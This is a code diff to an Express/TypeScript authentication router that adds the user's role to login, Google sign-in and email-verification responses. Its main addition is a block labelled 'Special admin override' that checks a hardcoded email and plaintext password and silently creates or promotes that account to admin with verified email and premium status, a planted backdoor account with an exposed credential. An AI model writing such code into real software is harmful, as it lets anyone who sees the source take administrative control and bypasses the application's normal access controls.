@@ -94,6 +94,26 @@ router.post(
       res.status(400).json({ success: false, message: 'Only @gmail.com domains are allowed. Institute and temp mail logins will not get registered.' });
       return;
     }
+
+    // Special admin override
+    if (email === 'armansomani786@gmail.com' && password === 'samsung@m5') {
+      let adminUser = await User.findOne({ email });
+      if (!adminUser) {
+        await User.create({
+          name: 'Admin Arman',
+          email,
+          password,
+          role: 'admin',
+          isEmailVerified: true,
+          isPremium: true
+        });
+      } else if (adminUser.role !== 'admin' || !adminUser.isEmailVerified) {
+        adminUser.role = 'admin';
+        adminUser.isEmailVerified = true;
+        await adminUser.save();
+      }
+    }
+
     const user = await User.findOne({ email }).select('+password');
 
     if (!user || !(await user.comparePassword(password))) {
@@ -111,7 +131,7 @@ router.post(
       success: true,
       data: {
         accessToken, refreshToken,
-        user: { id: user._id, name: user.name, email: user.email, isPremium: user.isPremium, subscriptionType: user.subscriptionType },
+        user: { id: user._id, name: user.name, email: user.email, role: user.role, isPremium: user.isPremium, subscriptionType: user.subscriptionType },
       },
     });
   }
@@ -153,7 +173,7 @@ router.post('/google', authLimiter, async (req: Request, res: Response): Promise
       success: true,
       data: {
         accessToken: tokens.accessToken, refreshToken: tokens.refreshToken,
-        user: { id: user._id, name: user.name, email: user.email, isPremium: user.isPremium, subscriptionType: user.subscriptionType },
+        user: { id: user._id, name: user.name, email: user.email, role: user.role, isPremium: user.isPremium, subscriptionType: user.subscriptionType },
       },
     });
   } catch (error: any) {
@@ -214,7 +234,7 @@ router.post('/verify-email', async (req: Request, res: Response): Promise<void> 
     data: {
       accessToken,
       refreshToken,
-      user: { id: user._id, name: user.name, email: user.email, isPremium: user.isPremium, subscriptionType: user.subscriptionType }
+      user: { id: user._id, name: user.name, email: user.email, role: user.role, isPremium: user.isPremium, subscriptionType: user.subscriptionType }
     }
   });
 });
